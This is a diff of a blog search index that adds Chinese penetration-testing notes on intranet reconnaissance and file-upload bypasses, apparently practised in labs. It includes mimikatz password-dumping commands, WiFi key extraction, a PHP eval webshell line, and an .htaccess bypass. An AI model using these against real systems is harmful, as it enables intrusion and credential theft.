@@ -477,34 +477,24 @@
       </categories>
   </entry>
   <entry>
-    <title>WEB安全系列-[信息收集]</title>
-    <url>/2022/04/13/WEB%E5%AE%89%E5%85%A8/WEB%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%5D/</url>
+    <title>Metasploit系列-[Kali基础]</title>
+    <url>/2022/05/01/Kali/Metasploit%E7%B3%BB%E5%88%97-%5BKali%E5%9F%BA%E7%A1%80%5D%20/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>Kali</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>WEB安全系列-[XSS跨站]</title>
+    <url>/2022/04/13/WEB%E5%AE%89%E5%85%A8/WEB%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BXSS%5D/</url>
     <content><![CDATA[]]></content>
       <categories>
         <category>WEB安全</category>
       </categories>
   </entry>
   <entry>
-    <title>WEB安全系列-[文件上传]</title>
-    <url>/2022/04/13/WEB%E5%AE%89%E5%85%A8/WEB%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%5D/</url>
-    <content><![CDATA[<p>22222收入的分第三方</p>
-]]></content>
-      <categories>
-        <category>WEB安全</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>内网安全系列-[ARP欺骗]</title>
-    <url>/2022/04/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BARP%E6%AC%BA%E9%AA%97%5D%20/</url>
-    <content><![CDATA[<p>22222收入的分第三方</p>
-]]></content>
-      <categories>
-        <category>内网安全</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>WEB安全系列-[XSS跨站]</title>
-    <url>/2022/04/13/WEB%E5%AE%89%E5%85%A8/WEB%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BXSS%5D/</url>
+    <title>WEB安全系列-[信息收集]</title>
+    <url>/2022/04/13/WEB%E5%AE%89%E5%85%A8/WEB%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%5D/</url>
     <content><![CDATA[]]></content>
       <categories>
         <category>WEB安全</category>
@@ -527,8 +517,8 @@
       </categories>
   </entry>
   <entry>
-    <title>内网安全系列-[IPC$入侵]</title>
-    <url>/2022/04/13/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BIPC$%E5%85%A5%E4%BE%B5%5D/</url>
+    <title>内网安全系列-[ARP欺骗]</title>
+    <url>/2022/04/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BARP%E6%AC%BA%E9%AA%97%5D%20/</url>
     <content><![CDATA[<p>22222收入的分第三方</p>
 ]]></content>
       <categories>
@@ -536,11 +526,12 @@
       </categories>
   </entry>
   <entry>
-    <title>内网系列-[IPC轻易入侵学校机房]</title>
-    <url>/2022/04/13/%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97/%E5%86%85%E7%BD%91%E7%B3%BB%E5%88%97-%5BIPC%E8%BD%BB%E6%98%93%E5%85%A5%E4%BE%B5%E5%AD%A6%E6%A0%A1%E6%9C%BA%E6%88%BF%5D/</url>
-    <content><![CDATA[]]></content>
+    <title>内网安全系列-[IPC$入侵]</title>
+    <url>/2022/04/13/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BIPC$%E5%85%A5%E4%BE%B5%5D/</url>
+    <content><![CDATA[<p>22222收入的分第三方</p>
+]]></content>
       <categories>
-        <category>黑客编程</category>
+        <category>内网安全</category>
       </categories>
   </entry>
   <entry>
@@ -552,8 +543,8 @@
       </categories>
   </entry>
   <entry>
-    <title>编程系列[python黑客编程]</title>
-    <url>/2022/04/13/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/%E7%BC%96%E7%A8%8B%E7%B3%BB%E5%88%97%5Bpython%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B%5D/</url>
+    <title>内网系列-[IPC轻易入侵学校机房]</title>
+    <url>/2022/04/13/%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97/%E5%86%85%E7%BD%91%E7%B3%BB%E5%88%97-%5BIPC%E8%BD%BB%E6%98%93%E5%85%A5%E4%BE%B5%E5%AD%A6%E6%A0%A1%E6%9C%BA%E6%88%BF%5D/</url>
     <content><![CDATA[]]></content>
       <categories>
         <category>黑客编程</category>
@@ -1066,9 +1057,571 @@
       </categories>
   </entry>
   <entry>
+    <title>小迪安全系列-[内网渗透]</title>
+    <url>/2022/05/01/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%5D%20/</url>
+    <content><![CDATA[<h1><span id="一-环境amp工作组amp局域网探针方案">一. 环境&amp;工作组&amp;局域网探针方案</span></h1><p>域环境&amp;工作组&amp;局域网探针方案</p>
+<p>DMZ:把一些不得不向外部提供服务的东西单独放在DMZ中，核心设备才放在内网，一把拿到WEB服务权限之后，还要突破DMZ的防火墙，加大了攻击的难度</p>
+<p><img src="/../../images/xdnwaq/1639281698075.png" alt="1639281698075"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#案例 1-基本信息收集操作演示<br>旨在了解当前服务器的计算机基本信息，为后续判断服务器角色，网络环境等做准备<br>systeminfo 详细信息<br>net start 启动服务<br>tasklist 进程列表<br>schtasks 计划任务<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#案例 2-网络信息收集操作演示<br>旨在了解当前服务器的网络接口信息，为判断当前角色，功能，网络架构做准备<br>1.ipconfig /all 判断存在域-dns<br>net view /domain 判断存在域<br>net time /domain 判断主域<br>netstat -ano 当前网络端口开放<br>nslookup 域名 追踪来源地址<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#案例 3-用户信息收集操作演示<br>旨在了解当前计算机或域环境下的用户及用户组信息，便于后期利用凭据进行测试<br>系统默认常见用户身份：<br>Domain Admins：域管理员（默认对域控制器有完全控制权）<br>Domain Computers：域内机器<br>Domain Controllers：域控制器<br>Domain Guest：域访客，权限低<br>Domain Users：域用户<br>Enterprise Admins：企业系统管理员用户（默认对域控制器有完全控制权）<br>相关用户收集操作命令：<br>whoami /all 用户权限<br>net config workstation 登录信息<br>net user 本地用户<br>net localgroup 本地用户组<br>net user /domain 获取域用户信息<br>net group /domain 获取域用户组信息<br>wmic useraccount get /all 涉及域用户详细信息<br>net group &quot;Domain Admins&quot; /domain 查询域管理员账户<br>net group &quot;Enterprise Admins&quot; /domain 查询管理员用户组<br>net group &quot;Domain Controllers&quot; /domain 查询域控制器<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#案例 4-凭据信息收集操作演示<br>旨在收集各种密文，明文，口令等，为后续横向渗透做好测试准备<br>计算机用户 HASH，明文获取-mimikatz(win)，mimipenguin(linux)<br>计算机各种协议服务口令获取-LaZagne(all)，XenArmor(win)<br>Netsh WLAN show profiles<br>Netsh WLAN show profile name=&quot;无线名称&quot; key=clear<br>1.站点源码备份文件、数据库备份文件等<br>2.各类数据库 Web 管理入口，如 PHPMyAdmin<br>3.浏览器保存密码、浏览器 Cookies<br>4.其他用户会话、3389 和 ipc$连接记录、回收站内容<br>5.Windows 保存的 WIFI 密码<br>6.网络内部的各种帐号和密码，如：Email、VPN、FTP、OA 等<br><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<ul>
+<li>ipconfig &#x2F;all 判断存在域-dns</li>
+</ul>
+<p><img src="/../../images/xdnwaq/1639294767368.png" alt="1639294767368"></p>
+<ul>
+<li>net time &#x2F;domain 判断主域</li>
+</ul>
+<p><img src="/../../images/xdnwaq/1639295816512.png" alt="1639295816512"></p>
+<ul>
+<li>netstat -ano 当前网络端口开放</li>
+</ul>
+<p><img src="/../../images/xdnwaq/163929592335397.png" alt="1639295925397"></p>
+<ul>
+<li><strong>收集域中的用户是为了获取用户名在那个组里面，享有那些权限，为后续密码攻击的手法做准备</strong></li>
+</ul>
+<p><img src="/../../images/xdnwaq/1639296689238.png" alt="1639296689238"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#案例 5-探针主机域控架构服务操作演示<br>为后续横向思路做准备，针对应用，协议等各类攻击手法<br>探针域控制器名及地址信息<br>net time /domain nslookup ping<br>探针域内存活主机及地址信息<br>nbtscan 192.168.3.0/24 第三方工具<br></code></pre></td></tr></table></figure>
+
+
+
+<h1><span id="探测存活主机">探测存活主机</span></h1><h2><span id="命令">命令</span></h2><ul>
+<li>系统自带命令探测存活主机</li>
+</ul>
+<p> for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr “TTL&#x3D;” 自带内部命令  </p>
+<p><img src="/../../images/xdnwaq/1639408618449.png" alt="1639408618449"></p>
+<p> nmap masscan 第三方 PowerShell 脚本 nishang empire 等 </p>
+<h2><span id="nishang">nishang</span></h2><p>Nishang下载地址：<a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1.#导入模块 nishang<br>Import-Module .\nishang.psm1<br><br>2.#设置执行策略<br>Set-ExecutionPolicy RemoteSigned<br><br>3.#获取模块 nishang 的命令函数<br>Get-Command -Module nishang<br><br>4.#获取常规计算机信息<br>Get-Information<br><br>5.#端口扫描（查看目录对应文件有演示语法，其他同理）<br>Invoke-PortScan -StartAddress 192.168.3.0 -EndAddress 192.168.3.100 -ResolveHost -ScanPort<br>#其他功能：删除补丁，反弹 Shell，凭据获取等<br><br></code></pre></td></tr></table></figure>
+
+<p>2.#设置执行策略出现访问被拒绝因为权限不足<br>Set-ExecutionPolicy RemoteSigned</p>
+<p><img src="/../../images/xdnwaq/1639411537057.png" alt="1639411537057"></p>
+<p>有权限</p>
+<p><img src="/../../images/xdnwaq/1639411593003.png" alt="1639411593003"></p>
+<h1><span id="获取密码">获取密码</span></h1><h2><span id="minikatz">Minikatz</span></h2><p>下载：<a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
+<p>1.提权：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">mimikatz # privilege::debug<br>Privilege &#x27;20&#x27; OK<br></code></pre></td></tr></table></figure>
+
+
+
+<p>2.获取用户&#x2F;密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">mimikatz # sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../../images/xdnwaq/1639809492888.png" alt="1639809492888"></p>
+]]></content>
+      <categories>
+        <category>小迪安全</category>
+      </categories>
+  </entry>
+  <entry>
     <title>小迪安全系列-[基础阶段]</title>
     <url>/2022/04/18/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E5%9F%BA%E7%A1%80%E9%98%B6%E6%AE%B5%5D/</url>
     <content><![CDATA[]]></content>
+      <categories>
+        <category>小迪安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>编程系列[python黑客编程]</title>
+    <url>/2022/05/02/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/%E7%BC%96%E7%A8%8B%E7%B3%BB%E5%88%97%5Bpython%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B%5D/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>黑客编程</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>小迪安全系列-[文件上传]</title>
+    <url>/2022/04/21/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%5D%20/</url>
+    <content><![CDATA[<h1><span id="文件上传">文件上传</span></h1><p> <img src="/../../images/xdwjsc/1622126816762-c2732d82-af6d-4dd4-a3bb-9d10addbdf80.png" alt="img"> </p>
+<h1><span id="一初始文件上传">一，初始文件上传</span></h1><p><strong>什么是文件上传漏洞?</strong></p>
+<ul>
+<li>指程序对文件的上传未作全面的限制，导致用户可以上传一些超越用户权限的一些文件，可以是木马，shell脚本，病毒等。</li>
+</ul>
+<p><strong>文件上传漏洞有哪些危害?</strong></p>
+<ul>
+<li>可以通过文件上传漏洞上传webshell后门。</li>
+</ul>
+<p><strong>文件上传漏洞如何查找及判断?</strong></p>
+<ul>
+<li>黑盒：使用扫描工具扫描打开网站。</li>
+<li>黑盒：测试会员中心，测试后台。</li>
+<li>白盒：直接撸源代码。</li>
+</ul>
+<p><strong>文件上传漏洞有哪些需要注意的地方?</strong></p>
+<ul>
+<li>拿到漏洞后要对漏洞<strong>类型</strong>进行区分，编辑器、第三方应用、常规等。</li>
+<li>区分漏洞类型</li>
+</ul>
+<p><strong>关于文件上传漏洞在实际应用中的说明?</strong></p>
+<ul>
+<li>上传后门脚本获取网站权限。</li>
+</ul>
+<hr>
+<p> <strong>文件上传漏洞有哪些需要注意的地方？</strong></p>
+<blockquote>
+<p>对文件上传类型进行区分，是属于编辑器文件上传，还是属于第三方应用，还是会员中心。要确保文件上传是什么类型，就用什么类型方法对它进行后期的测试。</p>
+</blockquote>
+<p><img src="/../../images/xdwjsc/1622126824257-4360481f-3368-4846-b0db-000bfb9b443e.png" alt="img"></p>
+<blockquote>
+<p>常规类：扫描获取上传，会员中心上传，后台系统上传，各种途径上传</p>
+<p>CMS类：已知CMS源码，搜索已知cms漏洞</p>
+<p>编辑器类：ckeditor,fckeditor,kindeditor,xxxeditor，也是搜索相关编辑器漏洞</p>
+<p>配合解析漏洞下的文件类型后门：可以通过解析漏洞，上传包含后门代码的图片</p>
+</blockquote>
+<h1><span id="二文件上传在实际应用中的方式">二，文件上传在实际应用中的方式</span></h1><p> <strong>方法一</strong></p>
+<blockquote>
+<p>​     先直接传一个PHP，实战先传马。</p>
+<p>​    实战先传一个正常的图片，看看有无返回存储地址。</p>
+<p>​    如果能直接上传并解析，已离成功不远。</p>
+</blockquote>
+<p> <strong>方法二</strong></p>
+<blockquote>
+<p>先传一个shell，然后进行修改。</p>
+<p>connect-Type:image&#x2F;jpeg，看看是否可以进行绕过，如果不行，在上传内容添加GIF89a</p>
+<p>当然上传了还得看是否能够被解析为php，所有的上传都要考虑是否能够被解析。</p>
+</blockquote>
+<p><strong>方法三</strong></p>
+<blockquote>
+<ul>
+<li>上传一个abc.abcd，目的只是为了查看是否为白名单还是黑名单绕过。</li>
+</ul>
+<p>​     黑名单限制一般为此文件类型不允许上传，考虑双写，大小         写，空格，php2,php3,php4,php5,pht</p>
+<p>​    phtml,等方式</p>
+<ul>
+<li>我们继续上传一个&#x2F;htaccess文件</li>
+</ul>
+</blockquote>
+<blockquote>
+<p>​    .htaccess文件能够设置服务器的解析文件的格式，匹配到dudu就已php的格式来解析，继而上传马</p>
+<ul>
+<li>如果说.htaccess不能上传，接下来上传一个.user.ini，继而上传一个马</li>
+</ul>
+</blockquote>
+<p> <strong>方法四</strong></p>
+<blockquote>
+<p>​    如果白名单限制上传</p>
+<ul>
+<li>考虑00截断上传</li>
+<li>文件包含漏洞+图片马</li>
+<li>文件包含漏洞+二次渲染+图片马</li>
+</ul>
+</blockquote>
+<p> <strong>方法五</strong></p>
+<blockquote>
+<p>​    上传的东西是否被服务器很快的删除或者移除，或者说上传成功，但是无法访问，就得考虑条件竞争。</p>
+</blockquote>
+<p>​    <strong>以上均不行，考虑逻辑层面的思路。</strong></p>
+<hr>
+<h3><span id="靶场源码">靶场源码：</span></h3><p><a href="https://github.com/c0ny1/upload-labs">upload-labs</a></p>
+<p><a href="https://www.fujieace.com/penetration-test/upload-labs-install.html">靶场搭建</a></p>
+<h1><span id="三常规文件上传地址的获取">三，常规文件上传地址的获取</span></h1><h3><span id="1使用谷歌语法搜索inurluploadphp">1.使用谷歌语法搜索inurl:upload.php</span></h3><p><img src="/../../images/xdwjsc/1629168732384-87fbfad2-4448-4cc9-b115-2369061f5ce8.png" alt="img"></p>
+<p><img src="/../../images/xdwjsc/1629168750363-0866b3fd-cc79-4c87-be44-bb6d1c7d2e9f.png" alt="img"></p>
+<p>搜索上传界面</p>
+<p><img src="/../../images/xdwjsc/1629168782687-1bfd408e-ff2e-4e44-a056-72a6599af345.png" alt="img"></p>
+<p><img src="/../../images/xdwjsc/1629168820723-6da654cc-ec5e-4bac-b30b-322013ec69c1.png" alt="img"></p>
+<p><img src="/../../images/xdwjsc/1629168848030-c70d865c-b335-4dd9-b89a-4e21396724a6.png" alt="img"></p>
+<p>使用工具扫描</p>
+<p><img src="/../../images/xdwjsc/1622130185771-2984bedb-5095-4215-81f7-6056372785aa.png" alt="img"></p>
+<h3><span id="2-不同格式下的文件类型后门测试">2. 不同格式下的文件类型后门测试</span></h3><p><img src="/../../images/xdwjsc/1629174694388-e7823587-79ab-440a-ade4-bff8a806b643.png" alt="img"></p>
+<p>不要妄想通过一个图片你能带着你的后门来控制网站。直接改格式有时候并没有什么用</p>
+<p><strong>什么格式代码就用什么格式去执行。</strong></p>
+<p><img src="/../../images/xdwjsc/1629174641258-79cf72de-8317-4e69-923b-4bb9636a8511.png" alt="img"></p>
+<h3><span id="3-配合解析漏洞下的文件类型后门测试">3. 配合解析漏洞下的文件类型后门测试</span></h3><p>nginx解析漏洞</p>
+<p><a href="https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerability/">https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerability/</a></p>
+<p><img src="/../../images/xdwjsc/1622134059414-85bea362-2ecc-4972-9158-b80f6a72d408.png" alt="img"></p>
+<p>照片使用编辑器打开，在末尾写入代码，可以多写几遍</p>
+<p><img src="/../../images/xdwjsc/1629177844565-228ea7dc-4d30-4e2e-9d4d-4a4576e98eb9.png" alt="img"></p>
+<p>然后将照片上传，发现上传成功</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/22078880/1629178139488-d46cc717-ac42-45ea-8d5a-a85ca5c9624a.png" alt="img"></p>
+<p>通过路径打开文件，正常显示，所以写入代码失败，正是由于上传的是图片格式而不是PHP代码格式，所以无法执行</p>
+<p><img src="/../../images/xdwjsc/1629178185605-f9507ca8-cd6d-4bef-90a6-003a1648dea9.png" alt="img"></p>
+<p>在路径后面加上1.php 发现可以执行了，这并不是说这样加了都可以，是因为这里有Ngiinx畸形解析漏洞， 对方在解析上的出现了混乱</p>
+<p>解析的规则是要看有没有漏洞，有的话可以按这种方法，没有的话就无法实现 </p>
+<p><img src="/../../images/xdwjsc/1629178853599-9108fbb2-1a64-4c06-be4f-491ed05268bc.png" alt="img"></p>
+<h3><span id="4-本地文件上传漏洞靶场环境搭建测试">4. 本地文件上传漏洞靶场环境搭建测试</span></h3><p><img src="/../../images/xdwjsc/1629166752352-ce27a81a-6d69-4a64-9558-f2eb184dbfba.png" alt="img"></p>
+<p>PHP称为后端语言是因为它的代码和你前端执行源代码是不同的。</p>
+<p>前端：代码直接在本地浏览器上执行。(不安全)</p>
+<p><img src="/../../images/xdwjsc/1629182307390-4df142d5-e27d-4bbe-9727-0a2c62202ba9.png" alt="img"></p>
+<p>后端：发送到对方服务器脚本里面，脚本再去验证去判断。</p>
+<p>前端代码过滤，删除这段代码即可</p>
+<p><img src="/../../images/xdwjsc/1622137600617-a1e11f61-7b78-4888-8daf-770d0a4647f1.png" alt="img"></p>
+<h3><span id="5-某cms及cve编号文件上传漏洞测试">5. 某CMS及CVE编号文件上传漏洞测试</span></h3><p>CMS </p>
+<p>存在会员中心，在上传头像界面可能存在文件上传漏洞</p>
+<p><img src="/../../images/xdwjsc/1629183140211-9c4072bb-b57f-43ea-bfd8-012ab84087f4.png" alt="img"></p>
+<p><img src="/../../images/xdwjsc/1629183195501-0a384d2e-56f9-42e0-b2ed-23a845449237.png" alt="img"></p>
+<p>上传操作是使用JS进行验证，在浏览器前端完成。所以抓不到包</p>
+<p><img src="/../../images/xdwjsc/1629183287807-3c92a4c1-7980-4a7d-8a00-60c6ead5d77b.png" alt="img"></p>
+<p>点击保存出现了数据包</p>
+<p><img src="/../../images/xdwjsc/1629183367027-b09ba000-5168-42cf-a481-2dc23c1a3a4c.png" alt="img"></p>
+<p>改成PHP</p>
+<p><img src="/../../images/xdwjsc/1629183577417-ccf85756-989c-4cf0-a3d8-1c3843be76f5.png" alt="img"></p>
+<p>上传时显示上传失败，显示的是失败，错误提示没有路径的回显</p>
+<p><img src="/../../images/xdwjsc/1629183842287-f11751df-23b2-46eb-9a8c-4e1922afab35.png" alt="img"></p>
+<p>注意到使用的是FineCMS，所以去搜索一些关于FineCMS的漏洞</p>
+<p><img src="/../../images/xdwjsc/1629184262664-3450ea59-f848-4ade-aa6c-4344299dece6.png" alt="img"></p>
+<p><img src="/../../images/xdwjsc/1629184294727-3aa4c2b8-11b2-4829-93dc-9dc4dfe3aae1.png" alt="img"></p>
+<p>根据前辈经验进行尝试</p>
+<p><img src="/../../images/xdwjsc/1629185584731-3ea3cfec-8920-47d2-887d-9ae131165730.png" alt="img"></p>
+<p>UID查找，发现cookies中含有。（也可以爆破）</p>
+<p><img src="/../../images/xdwjsc/1629185660350-2907e3f9-0eff-4204-86ed-ad2fa46c9454.png" alt="img"></p>
+<p>对后缀进行修改</p>
+<p><img src="/../../images/xdwjsc/1629185892129-4f7acd95-2c0c-4427-bad2-fd592fbe2be8.png" alt="img"></p>
+<p>修改uid为3</p>
+<p><img src="/../../images/xdwjsc/1629185923737-3d8051e9-df77-407a-a77b-16508beb611a.png" alt="img"></p>
+<p>上传时可能出现404，再上传一次上传成功</p>
+<p><img src="/../../images/xdwjsc/1629186008834-6d52113f-af75-4cac-b950-ed610c565b71.png" alt="img"></p>
+<p>执行成功</p>
+<p><img src="/../../images/xdwjsc/1629186097055-ddc33f34-75e4-44b3-bfe6-2f2139c292de.png" alt="img"></p>
+<p>weblogic任意文件上传漏洞</p>
+<p>启动靶场环境，获取账号密码</p>
+<p><img src="/../../images/xdwjsc/1629186608304-df88f8f3-79ab-484f-85e3-14d2f24cbcff.png" alt="img"></p>
+<p>打开本地IP 7001端口</p>
+<p>127.0.0.1:7001&#x2F;console</p>
+<p>登录账号密码</p>
+<p><img src="/../../images/xdwjsc/1629186702809-6541551f-d90d-46be-86ce-0f5850f1c38b.png" alt="img"></p>
+<p>点击base_domin</p>
+<p><img src="/../../images/xdwjsc/1629186798883-64f4d8d2-904f-4a28-83d1-c572f5ca97b9.png" alt="img"></p>
+<p>点击高级–&gt;勾选”启用web服务测试页”</p>
+<p><img src="/../../images/xdwjsc/1629186854350-37bfdc00-4e7b-4c89-8209-efe099bf2ddc.png" alt="img"></p>
+<p><img src="/../../images/xdwjsc/1629186913837-cda9e881-a823-4367-8b9d-0cefe2d3399b.png" alt="img"></p>
+<p><img src="/../../images/xdwjsc/1629186997198-a0a4cca5-8861-48d9-84d9-8cd37f478876.png" alt="img"></p>
+<p><img src="/../../images/xdwjsc/1629187035382-164f1123-678b-418d-b8f7-33b38bb7f47f.png" alt="img"></p>
+<p>上传后查看数据包，其中有时间戳</p>
+<p><img src="/../../images/xdwjsc/1629187112887-9becb0bf-1fa7-4fe7-916f-d0bc985c4706.png" alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/22078880/1629187133902-0641dc1b-624b-46ba-b574-17d86a809401.png" alt="img"></p>
+<p><img src="/../../images/xdwjsc/1629187265574-4324e364-c988-4a35-ab10-139e4bc29232.png" alt="img"></p>
+<p>文件上传成功</p>
+<p><img src="/../../images/xdwjsc/1629187281486-7d34556c-ad0b-4062-82c6-e935d76f73e6.png" alt="img"></p>
+<h1><span id="四黑白名单绕过">四，<strong>黑白名单绕过</strong></span></h1><p><img src="/../../images/xdwjsc/1650526844382.png" alt="1650526844382"></p>
+<h2><span id="pass-1-使用js对不合法图片进行检查前端js">Pass-1 (使用js对不合法图片进行检查[前端js])</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;?php @eval($_POST[123123])?&gt;<br>&lt;?php<br>phpinfo();<br>?&gt;<br></code></pre></td></tr></table></figure>
+
+
+
+<ol>
+<li><p>上传webshell提示不允许上传，限制了上传文件的类型</p>
+<p><img src="/../../images/xdwjsc/1650527232392.png" alt="1650527232392"></p>
+<p>这时要猜测判断文件后缀的代码是在前端还是后端<br>F12看源码</p>
+</li>
+</ol>
+<p><img src="/../../images/xdwjsc/1650527556710.png" alt="1650527556710"></p>
+<p>​    发现是js代码判断的</p>
+<p><img src="/../../images/xdwjsc/1650527511488.png" alt="1650527511488"></p>
+<ul>
+<li><p>方法一：删除部分js代码</p>
+<p><img src="/../../images/xdwjsc/1650528801745.png" alt="1650528801745"></p>
+</li>
+<li><p>方法二： firebug修改前端代码，添加允许上传类型.php</p>
+</li>
+</ul>
+<p><img src="/../../images/xdwjsc/1650528844905.png" alt="1650528844905"></p>
+<ul>
+<li><p>方法三：</p>
+<p>利用burp抓包，先把webshell后缀名改成网站允许上传的格式，在绕过前端验证后，在burp中将数据包格式改为小马原有格式</p>
+<p><img src="/../../images/xdwjsc/1650528749401.png" alt="1650528749401"></p>
+</li>
+</ul>
+<h2><span id="pass-2-mime类型">Pass-2  (MIME类型)</span></h2><p>跟Pass1 一样限制了文件上传的类型</p>
+<p>不是在js中，而是在服务器端进行了限制</p>
+<blockquote>
+<p><strong>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准</strong><br><strong>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据</strong><br><strong>在HTTP 协议中，使用Content-Type 字段表示文件的MIME 类型</strong></p>
+</blockquote>
+<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%5D%20.assets/1650529722352.png" alt="1650529722352"></p>
+<ul>
+<li>源码解析</li>
+</ul>
+<p><img src="/../../images/xdwjsc/1646821134815.png" alt="1646821134815"></p>
+<ul>
+<li><strong>验证代码，这种单一的文件验证是不安全的，上传时只需要修改对应的文件后缀名就可以</strong></li>
+</ul>
+<p><img src="/../../images/xdwjsc/1646822162417.png" alt="1646822162417"></p>
+<ul>
+<li>上传成功</li>
+</ul>
+<p><img src="/../../images/xdwjsc/1650529588209.png" alt="1650529588209"></p>
+<h2><span id="pass-3黑名单验证后缀名">Pass-3（黑名单验证[后缀名]）</span></h2><p>直接告诉我们不允许上传的文件后缀名</p>
+<p><img src="/../../images/xdwjsc/165053014478761.png" alt="1650530178761"></p>
+<p><strong>strrchr</strong></p>
+<p><img src="/../../images/xdwjsc/16468326879401.png" alt="1646832687901"></p>
+<p><img src="/../../images/xdwjsc/164683276844387.png" alt="1646832768387"></p>
+<ul>
+<li><strong>上传代码解析</strong></li>
+<li><strong>防止有些方法进行绕过</strong></li>
+</ul>
+<p><img src="/../../images/xdwjsc/164683310448347.png" alt="1646833108347"></p>
+<ul>
+<li><p><strong>上传PHP其他格式，如PHP5，PHP4，PHTML，上传成功</strong></p>
+<p>不过上传成功也是要有一些条件，需要Apache  httpd.conf配置文件，添加php5…添加此条件（默认开启）</p>
+<p><img src="/../../images/xdwjsc/1646833879697.png" alt="1646833879697"></p>
+</li>
+</ul>
+<p><img src="/../../images/xdwjsc/1646833754131.png" alt="1646833754131"></p>
+<h2><span id="pass-4htaccess解析">Pass-4（.htaccess解析）</span></h2><p>必Pass3还严格</p>
+<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%5D%20.assets/1650531887905.png" alt="1650531887905"></p>
+<ul>
+<li>绕过方法</li>
+</ul>
+<blockquote>
+<p> <strong>仅存在于Apache中</strong></p>
+<p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
+<p>通过htaccess来实现上传文件后缀自定义</p>
+</blockquote>
+<p>创建htaccess文件</p>
+<p> <strong>这样所有文件都会当成php来解析</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;FilesMatch &quot;shana&quot;&gt;<br>Sethandler application/x-httpd-php<br>&lt;/FilesMatch &gt;<br></code></pre></td></tr></table></figure>
+
+<p>先上传.htaccess文件，上传成功</p>
+<p><img src="/../../images/xdwjsc/1629275392238-76cbaf3c-3f48-467f-8a0d-1f07c21aa50a.png" alt="img"></p>
+<p>下载一张后缀名为jpg的图片，把图片名改为shana，即shana.jpg。打开图片，在最后增加一行php代码，然后上传</p>
